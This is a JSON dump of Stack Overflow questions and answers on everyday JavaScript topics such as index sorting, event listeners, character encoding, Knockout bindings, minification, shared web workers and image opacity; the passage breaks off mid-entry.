{
    "items": [
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<pre><code>var test = ['b', 'c', 'd', 'a'];\nvar test_with_index = [];\nfor (var i in test) {\n    test_with_index.push([test[i], i]);\n}\ntest_with_index.sort(function(left, right) {\n  return left[0] &lt; right[0] ? -1 : 1;\n});\nvar indexes = [];\ntest = [];\nfor (var j in test_with_index) {\n    test.push(test_with_index[j][0]);\n    indexes.push(test_with_index[j][1]);\n}\n</code></pre>\n\n<p><strong>Edit</strong></p>\n\n<p>You guys are right about <code>for .. in</code>. That will break if anybody munges the array prototype, which I observe annoyingly often. Here it is with that fixed, and wrapped up in a more usable function.</p>\n\n<pre><code>function sortWithIndeces(toSort) {\n  for (var i = 0; i &lt; toSort.length; i++) {\n    toSort[i] = [toSort[i], i];\n  }\n  toSort.sort(function(left, right) {\n    return left[0] &lt; right[0] ? -1 : 1;\n  });\n  toSort.sortIndices = [];\n  for (var j = 0; j &lt; toSort.length; j++) {\n    toSort.sortIndices.push(toSort[j][1]);\n    toSort[j] = toSort[j][0];\n  }\n  return toSort;\n}\n\nvar test = ['b', 'c', 'd', 'a'];\nsortWithIndeces(test);\nalert(test.sortIndices.join(\",\"));\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 14
                },
                {
                    "body": "<pre><code>Array.prototype.sortIndices = function (func) {\n    var i = j = this.length,\n        that = this;\n\n    while (i--) {\n        this[i] = { k: i, v: this[i] };\n    }\n\n    this.sort(function (a, b) {\n        return func ? func.call(that, a.v, b.v) : \n                      a.v &lt; b.v ? -1 : a.v &gt; b.v ? 1 : 0;\n    });\n\n    while (j--) {\n        this[j] = this[j].k;\n    }\n}\n</code></pre>\n\n<p>YMMV on how you feel about adding functions to the Array prototype and mutating arrays inline, but this allows sorting of an array of any objects that can be compared. It takes an optional function that can be used for sorting, much like <code>Array.prototype.sort</code>.</p>\n\n<p>An example,</p>\n\n<pre><code>var test = [{b:2},{b:3},{b:4},{b:1}];\n\ntest.sortIndices(function(a,b) { return a.b - b.b; });\n\nconsole.log(test); // returns [3,0,1,2]\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I would just fill an array with numbers 0..n-1, and sort that with a compare function.</p>\n\n<pre><code>var test = ['b', 'c', 'd', 'a'];\nvar len = test.length;\nvar indices = new Array(len);\nfor (var i = 0; i &lt; len; ++i) indices[i] = i;\nindices.sort(function (a, b) { return test[a] &lt; test[b] ? -1 : test[a] &gt; test[b] ? 1 : 0; });\nconsole.log(indices);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>Suppose I have a Javascript array, like so: </p>\n\n<pre><code>var test = ['b', 'c', 'd', 'a'];\n</code></pre>\n\n<p>I want to sort the array. Obviously, I can just do this to sort the array:</p>\n\n<pre><code>test.sort(); //Now test is ['a', 'b', 'c', 'd']\n</code></pre>\n\n<p>But what I really want is an array of indices that indicates the position of the sorted elements with respect to the original elements. I'm not quite sure how to phrase this, so maybe that is why I am having trouble figuring out how to do it. </p>\n\n<p>If such a method was called sortIndices(), then what I would want is:</p>\n\n<pre><code>var indices = test.sortIndices();\n//At this point, I want indices to be [3, 0, 1, 2].\n</code></pre>\n\n<p>'a' was at position 3, 'b' was at 0, 'c' was at 1 and 'd' was a 2 in the original array. Hence, [3, 0, 1, 2].</p>\n\n<p>One solution would be to sort a copy of the array, and then cycle through the sorted array and find the position of each element in the original array. But, that feels clunky. </p>\n\n<p>Is there an existing method that does what I want? If not, how would you go about writing a method that does this? Thank you for your help.</p>\n",
            "last_activity_date": 1358773984,
            "question_id": 3730510,
            "score": 12,
            "tags": [
                "javascript",
                "indexing",
                "sorting"
            ],
            "title": "Javascript: Sort array and return an array of indicies that indicates the position of the sorted elements with respect to the original elements"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>I do not know of one, and a search on Google didn't yield any obvious results. One easy, kludgy solution is to create a function that cycles through every event and sets it to <code>null</code>, such as</p>\n\n<pre><code>function removeEvents(obj)\n{\n    obj.onblur = null;\n    obj.onchange = null;\n    obj.onclick = null;\n    // ...\n}\n</code></pre>\n\n<p>Call this function as follows: <code>removeEvents(myElem)</code>. A complete list of JavaScript event handlers can be found at <a href=\"http://www.elated.com/articles/events-and-event-handlers/\" rel=\"nofollow\">http://www.elated.com/articles/events-and-event-handlers/</a>.</p>\n\n<p>Undoubtedly there is a more elegant way to write this function, but I don't know if there is a more elegant way to solve this problem. It would be lovely if someone knows of one. If you are binding events through a JavaScript library, such as jQuery, there may be other, better options.</p>\n",
                    "is_accepted": false,
                    "score": -6
                },
                {
                    "body": "<p>If you use <code>cloneNode</code>, the event listeners <strong>won't be copied</strong>.</p>\n\n<p>If you want a robust solution your best bet is probably to write a wrapper to <code>attach/detach</code> listeners, and keep track of them yourself. Something like <strong><a href=\"http://dean.edwards.name/weblog/2005/10/add-event/\">Dean Edwards' addEvent</a></strong>.</p>\n",
                    "is_accepted": true,
                    "score": 13
                }
            ],
            "body": "<p>Is it possible to remove all event listeners of an element and its children? Something like:</p>\n\n<pre><code>myElem.removeEventListeners();\n</code></pre>\n\n<p>I need this because I have a complex element with events, and I need to create a copy of it -- like a static image that does not react to any events.</p>\n",
            "last_activity_date": 1278841357,
            "question_id": 3222486,
            "score": 12,
            "tags": [
                "javascript",
                "html",
                "css"
            ],
            "title": "Remove all JavaScript event listeners of an element and its children?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<blockquote>\n  <p>It is my understanding that Javascript uses UTF-8 for its strings</p>\n</blockquote>\n\n<p>No, no.</p>\n\n<p>Each page has its charset enconding defined in meta tag, <strong>just bellow</strong> head element</p>\n\n<pre><code>&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"/&gt;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html; charset=ISO-8859-1\"/&gt;\n</code></pre>\n\n<p>Besides that, each page <strong>should be edited with the target charset encoding</strong>. Otherwise, it will not work as expected.</p>\n\n<p>And it is a good idea to define its target charset encoding on server side.</p>\n\n<pre><code>Java\n&lt;%@page pageEncoding=\"UTF-8\" contentType=\"text/html; charset=UTF-8\"%&gt;\n\nPHP\nheader(\"Content-Type: text/html; charset=UTF-8\");\n\nC#\nI do not know how to...\n</code></pre>\n\n<p>And it could be a good idea to set up each script file whether it uses sensitive characters (\u00e1, \u00e9, \u00ed, \u00f3, \u00fa and so on...).</p>\n\n<pre><code>&lt;script type=\"text/javascript\" charset=\"UTF-8\" src=\"/PATH/TO/FILE.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>...</p>\n\n<blockquote>\n  <p>So it is my theory that if I transcode the string to ISO-8859-1 before sending it, it should solve my problem</p>\n</blockquote>\n\n<p>No, no.</p>\n\n<p>The target server <strong>could handle strings in other than ISO-8859-1</strong>. For instance, Tomcat handles in ISO-8859-1, no matter how you set up your page. So, on server side, you could have to set up your request according how your set up your page.</p>\n\n<pre><code>Java\nrequest.setCharacterEncoding(\"UTF-8\")\n\nPHP\n// I do not know how to...\n</code></pre>\n\n<p>If you really want to translate the target charset encoding, TRY as follows</p>\n\n<pre><code>InternetExplorer\n    formElement.encoding = \"application/x-www-form-urlencoded; charset=ISO-8859-1\";\nELSE\n    formElement.enctype  = \"application/x-www-form-urlencoded; charset=ISO-8859-1\";\n</code></pre>\n\n<p><strong>Or</strong> you should provide a function that gets the numeric representation, in Unicode Character Set, used by each character. It will work regardless of the target charset encoding. For instance, \u00e1 as Unicode Character Set is \\u00E1;</p>\n\n<pre><code>alert(\"\u00e1 without its Unicode Character Set numerical representation\");\nfunction convertToUnicodeCharacterSet(value) {\n    if(value == \"\u00e1\")\n        return \"\\u00E1\";\n}\nalert(\"\u00e1 Numerical representation in Unicode Character Set is: \" + convertToUnicodeCharacterSet(\"\u00e1\"));\n</code></pre>\n\n<p><a href=\"http://jsbin.com/anaci\">Here</a> you can see in action:</p>\n\n<p>You can use this <a href=\"http://rishida.net/tools/conversion/\">link</a> as guideline (See JavaScript escapes)</p>\n\n<p><strong>Added to original answer how I implement jQuery funcionality</strong></p>\n\n<pre><code>var dataArray = $(formElement).serializeArray();\nvar queryString = \"\";\nfor(var i = 0; i &lt; dataArray.length; i++) {\n    queryString += \"&amp;\" + dataArray[i][\"name\"] + \"+\" + encodeURIComponent(dataArray[i][\"value\"]);\n}\n$.ajax({\n    url:\"url.htm\",\n    data:dataString,\n    contentType:\"application/x-www-form-urlencoded; charset=UTF-8\",\n    success:function(response) {\n        // proccess response\n    });\n});\n</code></pre>\n\n<p>It works fine without any headache.</p>\n\n<p>Regards,</p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>I had a very similar problem. I needed to pass a URL parameter using JQuery to make an ajax call, and most of the times parameters values included accents.</p>\n\n<p>Both pages had to be set to charset=ISO-8859-1 and javascript's functions: encodeURI, encodeURIComponent etc. only uses UTF-8.</p>\n\n<p>What I did was to create a link in the original page, including all parameters without any encoding, let's say:</p>\n\n<pre><code>var myLink = document.getElementById(\"myHiddenLink\");\nmyLink.setAttribute(\"href\", \"M\u00e9xico, Per\u00fa, Mar\u00eda and any other words with accents and spaces\");\n</code></pre>\n\n<p>and then assign the href value to a variable, like this:</p>\n\n<pre><code>var theLink = myLink.getAttribute(\"href\");\n</code></pre>\n\n<p>So finally \"theLink\" variable value was ISO-8859-1 encoded, and everything worked just fine.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>I'm writing a Chrome extension that works with a website that uses ISO-8859-1. Just to give some context, what my extension does is making posting in the site's forums quicker by adding a more convenient post form. The value of the textarea where the message is written is then sent through an Ajax call (using jQuery).</p>\n\n<p>If the message contains characters like <code>\u00e1</code> these characters appear as \u00c3\u00a1 in the posted message. Forcing the browser to display UTF-8 instead of ISO-8859-1 makes the <code>\u00e1</code> appear correctly.</p>\n\n<p>It is my understanding that Javascript uses UTF-8 for its strings, so it is my theory that if I transcode the string to ISO-8859-1 before sending it, it should solve my problem. However there seems to be no direct way to do this transcoding in Javascript, and I can't touch the server side code. Any advice?</p>\n\n<p>I've tried setting the created form to use iso-8859-1 like this:</p>\n\n<pre><code>var form = document.createElement(\"form\");\nform.enctype = \"application/x-www-form-urlencoded; charset=ISO-8859-1\";\n</code></pre>\n\n<p>And also:</p>\n\n<pre><code>var form = document.createElement(\"form\");\nform.encoding = \"ISO-8859-1\";\n</code></pre>\n\n<p>But that doesn't seem to work.</p>\n\n<p>EDIT:</p>\n\n<p>The problem actually lied in how jQuery was urlencoding the message (or something along the way), I fixed this by telling jQuery not to process the data and doing it myself as is shown in the following snippet:</p>\n\n<pre><code>function cfaqs_post_message(msg) {\n  var url = cfaqs_build_post_url();\n  msg = escape(msg).replace(/\\+/g, \"%2B\");\n  $.ajax({\n    type: \"POST\",\n    url: url,\n    processData: false,\n    data: \"message=\" + msg + \"&amp;post=Preview Message\",\n    success: function(html) {\n      // ...\n    },\n    dataType: \"html\",\n    contentType: \"application/x-www-form-urlencoded\"\n  });\n}\n</code></pre>\n",
            "last_activity_date": 1382428989,
            "question_id": 2283829,
            "score": 12,
            "tags": [
                "javascript",
                "utf-8",
                "google-chrome-extension",
                "iso-8859-1",
                "transcoding"
            ],
            "title": "How do I transcode a Javascript string to ISO-8859-1?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>One alternative you can use to keep your code a bit cleaner is to use a custom binding that wraps the value binding by initializing it with the element's current value. </p>\n\n<p>You can even have it create observables on your view model, if they don't exist. </p>\n\n<p>The binding might look something like:</p>\n\n<pre><code>ko.bindingHandlers.valueWithInit = {\n    init: function(element, valueAccessor, allBindingsAccessor, data) {\n        var property = valueAccessor(),\n            value = element.value;\n\n        //create the observable, if it doesn't exist \n        if (!ko.isWriteableObservable(data[property])) {\n            data[property] = ko.observable();\n        }\n\n        data[property](value);\n\n        ko.applyBindingsToNode(element, { value: data[property] });\n    }\n};\n</code></pre>\n\n<p>You would use it like:</p>\n\n<pre><code>&lt;input value=\"someValue\" data-bind=\"valueWithInit: 'firstName'\" /&gt;\n</code></pre>\n\n<p>Note that the property name is in quotes, this allows the binding to create it, if it does not exist rather than error out from an undefined value.</p>\n\n<p>Here is a sample: <a href=\"http://jsfiddle.net/rniemeyer/BnDh6\">http://jsfiddle.net/rniemeyer/BnDh6</a> </p>\n",
                    "is_accepted": true,
                    "score": 13
                },
                {
                    "body": "<p>A little late here. I wasn't actually satisfied with RP's answer, because it breaks the declarative nature of Knockout. Specifically, if you use valueWithInit to define your property, you can't <em>use</em> it in an earlier binding. Here's a <a href=\"http://jsfiddle.net/joeyespo/LYb72/\">fork of his jsfiddle to demonstrate</a>.</p>\n\n<p>You use it the same way, yet it's still document-wide declarative under the hood:</p>\n\n<pre><code>&lt;input data-bind=\"valueWithInit: firstName\" value=\"Joe\" /&gt;\n</code></pre>\n\n<p>Extending on the idea, you can also use this to separate the initialization and the binding:</p>\n\n<pre><code>&lt;input data-bind=\"initValue: lastName, value: lastName\" value=\"Smith\" /&gt;\n</code></pre>\n\n<p>This is a little redundant, but becomes useful when you're using a plugin instead of the built-in bindings:</p>\n\n<pre><code>&lt;input data-bind=\"initValue: lastName, myPlugin: lastName\" value=\"Smith\" /&gt;\n</code></pre>\n\n<p>Expanding a little more, I also needed a way to initialize checkboxes:</p>\n\n<pre><code>&lt;input type=\"checkbox\" data-bind=\"checkedWithInit: isEmployed\" checked /&gt;\n</code></pre>\n\n<p>And here are the handlers:</p>\n\n<pre><code>ko.bindingHandlers.initValue = {\n    init: function(element, valueAccessor) {\n        var value = valueAccessor();\n        if (!ko.isWriteableObservable(value)) {\n            throw new Error('Knockout \"initValue\" binding expects an observable.');\n        }\n        value(element.value);\n    }\n};\n\nko.bindingHandlers.initChecked = {\n    init: function(element, valueAccessor) {\n        var value = valueAccessor();\n        if (!ko.isWriteableObservable(value)) {\n            throw new Error('Knockout \"initChecked\" binding expects an observable.');\n        }\n        value(element.checked);\n    }\n};\n\nko.bindingHandlers.valueWithInit = {\n    init: function(element, valueAccessor, allBindings, data, context) {\n        ko.applyBindingsToNode(element, { initValue: valueAccessor() }, context);\n        ko.applyBindingsToNode(element, { value: valueAccessor() }, context);\n    }\n};\n\nko.bindingHandlers.checkedWithInit = {\n    init: function(element, valueAccessor, allBindings, data, context) {\n        ko.applyBindingsToNode(element, { initChecked: valueAccessor() }, context);\n        ko.applyBindingsToNode(element, { checked: valueAccessor() }, context);\n    }\n};\n</code></pre>\n\n<p>Notice <code>valueWithInit</code> simply uses <code>initValue</code> under the hood.</p>\n\n<p>See it <a href=\"http://jsfiddle.net/joeyespo/uEvd3/\">in action on jsfiddle</a>.</p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>I'm trying to create an <code>HtmlHelper</code> extension that outputs some HTML to the view. In this HTML I'm wiring up some KnockoutJS binding. I'm new to KO so I'm still struggling in getting some things done. Anyway, what I'm trying to do is generate input fields (in the server-side code) bound to observables on my client-side code, then set the initial values of the observables through the value of the hidden fields. Unfortunately, that is not working for me. So I'm wondering if there any way I could get this done (even if I have to do it completely different).</p>\n\n<p>Here's what I'm basically doing: </p>\n\n<p>In my client side view model I have the following:</p>\n\n<pre><code>self.dataSource = ko.observable();\nself.pageSize = ko.observable();\n</code></pre>\n\n<p>And my extension method outputs the following:</p>\n\n<pre><code>&lt;input type=\"hidden\" value=\"/Employee/Get\" data-bind=\"value: dataSource\" /&gt;\n&lt;input type=\"hidden\" value=\"30\" data-bind=\"value: pageSize\" /&gt;\n</code></pre>\n\n<p>But when the page renders, when I inspect the elements I notice that the <code>value</code> of the input fields is being set to an empty string, which I believe is because of the way observables are being declared. But is there a way to override this behavior or something?</p>\n",
            "last_activity_date": 1393365375,
            "question_id": 12125143,
            "score": 11,
            "tags": [
                "javascript",
                "data-binding",
                "knockout.js",
                "observable"
            ],
            "title": "Giving initial value to observable from the HTML markup"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>The lines (excluding the license) are all around 30k characters in length. It could be to avoid bugs where some Javascript parsers die on extremely long lines. This probably won't happen on today's browsers but maybe some older or more obscure ones have such limits.</p>\n\n<hr>\n\n<p><em>(Old answer below, which might also be applicable, just not in this case)</em></p>\n\n<p>This might be because <a href=\"http://www.crockford.com/javascript/jsmin.html\" rel=\"nofollow\">JSMin</a>, a popular Javascript minifier will retain line feeds in the output under certain conditions. This is because in Javascript line feeds <em>are</em> significant if you leave out semicolons, for example. The documentation says:</p>\n\n<blockquote>\n  <p>It is more conservative in omitting linefeeds, because linefeeds are sometimes treated as semicolons. A linefeed is not omitted if it precedes a non-ASCII character or an ASCII letter or digit or one of these characters:</p>\n\n<pre><code>\\ $ _ { [ ( + -\n</code></pre>\n  \n  <p>and if it follows a non-ASCII character or an ASCII letter or digit or one of these characters:</p>\n\n<pre><code>\\ $ _ } ] ) + - \" '\n</code></pre>\n</blockquote>\n\n<p>Other minifiers might have similar rules.</p>\n\n<p>So this is mostly a precaution against accidentally removing a line feed that may be necessary, syntax-wise. The last thing you want is that your minified JS won't work anymore because the minifier destroyed its semantics.</p>\n\n<p>Regarding <em>\u00bbI know three newlines (not counting the license) is not going to slow it down a lot, but still, doesn't every tiny bit help?\u00ab</em>: When your server uses gzip compression the difference will likely be moot anyway.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>To cite the <a href=\"https://developers.google.com/closure/compiler/faq#linefeeds\">Closure Compiler FAQ</a>:</p>\n\n<blockquote>\n  <p>The Closure Compiler intentionally adds line breaks every 500\n  characters or so. Firewalls and proxies sometimes corrupt or ignore\n  large JavaScript files with very long lines. Adding line breaks every\n  500 characters prevents this problem. Removing the line breaks has no\n  effect on a script's semantics. The impact on code size is small, and\n  the Compiler optimizes line break placement so that the code size\n  penalty is even smaller when files are gzipped.</p>\n</blockquote>\n\n<p>This is relevant to any minification programs in general.</p>\n",
                    "is_accepted": false,
                    "score": 11
                },
                {
                    "body": "<p><a href=\"http://stackoverflow.com/questions/6608079/which-tools-does-jquery-use-to-compress-its-source-code\">jQuery currently use</a> UglifyJS to minify their source code. In <a href=\"https://github.com/jquery/jquery/blob/1.7.2/build/uglify.js\">their build script</a>, they <a href=\"https://github.com/jquery/jquery/blob/1.7.2/build/uglify.js#L19\">specifically set</a> the <code>max_line_length</code> directive to be <code>32 * 1024</code>:</p>\n\n<p>The <a href=\"https://github.com/mishoo/UglifyJS\">documentation for UglifyJS</a> has this to say on the <code>max-line-len</code> directive;</p>\n\n<blockquote>\n  <p><code>--max-line-len</code> (default 32K characters) \u2014 add a newline after around 32K characters. I\u2019ve seen both FF and Chrome croak when all the code was on a single line of around 670K. Pass \u2013max-line-len 0 to disable this safety feature.</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 17
                }
            ],
            "body": "<p>I know about a <a href=\"http://stackoverflow.com/questions/3118776/when-i-minify-css-or-js-why-isnt-it-all-on-one-line\">similar question</a> but it is a <em>tiny</em> bit off from what I am asking here, so <em>please</em> don't <code>flag</code> it as a duplicate.</p>\n\n<p>When you see the <a href=\"http://code.jquery.com/jquery-1.7.2.min.js\">production version of jQuery</a>, why is there a newline after a while? I downloaded a copy and deleted all the newlines (apart from the licence) and it still worked. (I ran the <strong>entire</strong> unit test suite against my changes on Mozilla Firefox, Google Chrome and Opera.)</p>\n\n<p><img src=\"http://i.stack.imgur.com/9HwfF.png\" alt=\"The problem. In Google Chrome's &quot;view source&quot;\"></p>\n\n<p>I know three newlines (not counting the license) is not going to slow it down a lot, but still, doesn't every tiny bit help?</p>\n\n<p>I have assigned myself a small challenge, to squeeze every little bit of performance out of my JavaScript code.</p>\n",
            "last_activity_date": 1335695103,
            "question_id": 10193851,
            "score": 11,
            "tags": [
                "javascript",
                "performance",
                "optimization",
                "minify"
            ],
            "title": "Why do we have newlines in minified JavaScript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>It seems like this is basically the same problem as <a href=\"http://stackoverflow.com/questions/8875310/what-happens-to-an-html5-web-worker-thread-when-the-tab-is-closed-while-its-run\">the question 'What happens to an HTML5 web worker thread when the tab is closed while it's running?'</a>.  I think the key part of the spec is <a href=\"http://www.whatwg.org/specs/web-apps/current-work/multipage/workers.html#kill-a-worker\" rel=\"nofollow\">this statement</a>:</p>\n\n<blockquote>\n  <p>User agents may invoke the \"kill a worker\" processing model on a\n  worker at any time, e.g. in response to user requests, in response to\n  CPU quota management, or when a worker stops being an active needed\n  worker if the worker continues executing even after its closing flag\n  was set to true.</p>\n</blockquote>\n\n<p>An '<a href=\"http://www.whatwg.org/specs/web-apps/current-work/multipage/workers.html#active-needed-worker\" rel=\"nofollow\">active needed worker</a>' is defined as follows:</p>\n\n<blockquote>\n  <p>A worker is said to be an active needed worker if any of the Document\n  objects in the worker's Documents are fully active.</p>\n</blockquote>\n\n<p>So, as I understand it, if all the windows referencing a worker are closed then the browser is required by the spec to terminate the worker, but not immediately.  Depending on it persisting will therefore be unreliable even if it appears to work occasionally.</p>\n\n<p>In your example my approach would be to load the whole site by Ajax - you're not going to be able to run the Web Workers if your users have JS disabled anyhow, then use the <a href=\"http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html#the-history-interface\" rel=\"nofollow\">History API</a> to make the user's page address correspond to the actual page (maintaining search engine and non-JS compatibility).</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I have done some testing to find out the answer to this in practice.</p>\n\n<p>Firefox does not yet support creating WebSocket connections from Web Workers: <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=504553\">https://bugzilla.mozilla.org/show_bug.cgi?id=504553</a> So Firefox is not relevant until that bug is resolved.</p>\n\n<p>IE 10 doesn't have <a href=\"http://caniuse.com/#feat=sharedworkers\">support for Shared Web Workers</a> so it's not relevant either. So that leaves Chrome.</p>\n\n<p>Here is an example to test shared web workers.</p>\n\n<p>First the HTML:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n    &lt;a href=\"shared.html\"&gt;reload page&lt;/a&gt;\n    &lt;script&gt;\n        var worker = new SharedWorker(\"shared.js\");\n        worker.port.addEventListener(\"message\", function(e) {\n            console.log(\"Got message: \" + e.data);\n        }, false);\n        worker.port.start();\n        worker.port.postMessage(\"start\");\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Then the implementation of the shared worker itself in <code>shared.js</code>:</p>\n\n<pre><code>var connections = 0;\n\nself.addEventListener(\"connect\", function(e) {\n    var port = e.ports[0];\n    connections ++;\n    port.addEventListener(\"message\", function(e) {\n        if (e.data === \"start\") {\n            var ws = new WebSocket(\"ws://localhost:6080\");\n            port.postMessage(\"started connection: \" + connections);\n        }\n    }, false);\n    port.start();\n}, false);\n</code></pre>\n\n<p>Test results in Chrome 20 (<strong>the answer</strong>):</p>\n\n<p>When the page is loaded simultaneously in two separate tabs, the connection count grows each time one of the pages is reloaded or the self-referential link is clicked.</p>\n\n<p>If only a single instance of the page is loaded then the connection count never changes when the page is reloaded or the link is clicked.</p>\n\n<p>So, in Chrome 20: <strong>Shared Web Workers do not persist across page reloads and link navigation clicks</strong>.</p>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>I have had success with a somewhat roundabout technique whereby when I want to go to the next page but maintain the SharedWorker, I open up a (hopefully unobtrusive) popup window that creates the same worker, wait for it to become active and send a message to the original port/window, which then navigates to the new page and then, when that page loads, closes the popup. This strategy maintains at least one active connection at all times, so the worker never decides to shut down.</p>\n\n<p>This technique seems to be fairly robust so far. Although seeing the popup is somewhat annoying, it's a reasonable compromise for some use cases.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p><a href=\"http://www.whatwg.org/specs/web-apps/current-work/#shared-workers-introduction\">Shared Web Workers</a> are designed to allow multiple pages from the same site (origin) to share a single Web Worker.</p>\n\n<p>However, it's not clear to me from the spec (or other tutorials and information on Shared Workers) whether the Shared Worker will persist if you have only one window/tab from the site and you navigate to another page on the same site.</p>\n\n<p>This would be most useful in the case of a WebSocket connection from the Shared Worker that stays connected as the site is navigated. For example, imagine a stock ticker or chat area that would persist (without having to reconnect the WebSocket) even while the site is navigated.</p>\n",
            "last_activity_date": 1364436522,
            "question_id": 9336774,
            "score": 11,
            "tags": [
                "javascript",
                "multithreading",
                "html5",
                "websocket",
                "web-worker"
            ],
            "title": "Do Shared Web Workers persist across a single page reload, link navigation"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>You could use jQuery's <a href=\"http://api.jquery.com/animate/\" rel=\"nofollow\">animate</a> or <a href=\"http://api.jquery.com/fadeTo/\" rel=\"nofollow\">fadeTo</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I'm not sure if you can do this in every browser but you can set the css property of the specified img.<br/> Try to work with jQuery which allows you to make css changes much faster and efficiently.<br> in jQuery you will have the options of using <code>.animate(),.fadeTo(),.fadeIn(),.hide(\"slow\"),.show(\"slow\")</code> for example.<br/> I mean this CSS snippet should do the work for you:<br></p>\n\n<pre><code>img\n{\nopacity:0.4;\nfilter:alpha(opacity=40); /* For IE8 and earlier */\n}\n</code></pre>\n\n<p>Also check out this website where everything further is explained:<br/> <a href=\"http://www.w3schools.com/css/css_image_transparency.asp\" rel=\"nofollow\">http://www.w3schools.com/css/css_image_transparency.asp</a> </p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You can use CSS to set the opacity, and than use javascript to apply the styles to a certain element in the DOM.</p>\n\n<pre><code>.opClass {\n    opacity:0.4;\n    filter:alpha(opacity=40); /* For IE8 and earlier */\n}\n</code></pre>\n\n<p>Than use (for example) jQuery to change the style:</p>\n\n<pre><code>$('#element_id').addClass('opClass');\n</code></pre>\n\n<p>Or with plain javascript, like this:</p>\n\n<pre><code>document.getElementById(\"element_id\").className = \"opClass\";\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You could use Jquery indeed or plain good old javascript:</p>\n\n<pre><code>var opacityPercent=30;\ndocument.getElementById(\"id\").style.cssText=\"opacity:0.\"+opacityPercent+\"; filter:progid:DXImageTransform.Microsoft.Alpha(style=0,opacity=\"+opacityPercent+\");\";\n</code></pre>\n\n<p>You put this in a function that you call on a setTimeout until the desired opacity is reached</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Supposing you're using plain JS (see other answers for JQuery), to an element's opacity, write:</p>\n\n<pre><code>var element = document.getElementById('id');\nelement.style.opacity = \"0.9\";\nelement.style.filter  = 'alpha(opacity=90)'; // IE fallback\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 19
                },
                {
                    "body": "<p>In fact, you need to use CSS.<br>\n  <code>document.getElementById(\"myDivId\").setAttribute(\"style\",\"opacity:0.5; -moz-opacity:0.5; filter:alpha(opacity=50)\");</code></p>\n\n<p>It works on FireFox, Chrome and IE. </p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>how can I change image opacity using javascript? I'm going to create a fading effect using javascript, is there any sample? is there anything like image.opacity that can be changed through JS code? how is it set?</p>\n\n<p>thanks</p>\n",
            "last_activity_date": 1401200848,
            "question_id": 8517173,
            "score": 11,
            "tags": [
                "javascript"
            ],
            "title": "change image opacity using javascript"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>There is a google library for this.  Visit \n<a href=\"http://pypi.python.org/pypi/googlemaps/1.0.2\" rel=\"nofollow\">this site</a>.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You could use the Google Maps API. It has an API function that does exactly this:\n<a href=\"http://code.google.com/intl/da-DK/apis/maps/documentation/javascript/services.html#ReverseGeocoding\" rel=\"nofollow\">http://code.google.com/intl/da-DK/apis/maps/documentation/javascript/services.html#ReverseGeocoding</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>99% of the time, most people link you to Google Maps's API. Not a bad answer. HOWEVER -- Beware of the prohibited uses, usage limits and <a href=\"http://code.google.com/apis/maps/terms.html#section_10_12\">Terms of Use</a>! While a distributed app many not run afoul of the usage limit, it is quite limiting for a web app. The TOS does not allow you to repurpose Google's data into an app with your skin on it. You would hate to have your business plan derailed by a cease and desist letter from Google, no? </p>\n\n<p>All is not lost. There are several open sources of data, including US Government sources. Here are a few of the best:</p>\n\n<p>The US Census <a href=\"http://www.census.gov/geo/www/tiger/\">Tiger Database</a>, in particular, supports reverse geocoding and is free and open for US addresses. Most other databases derive from it in the US. </p>\n\n<p><a href=\"http://www.geonames.org/\">Geonames</a> and <a href=\"http://www.openstreetmap.org/\">OpenStreetMap</a> are user supported in the Wikipedia model.  </p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
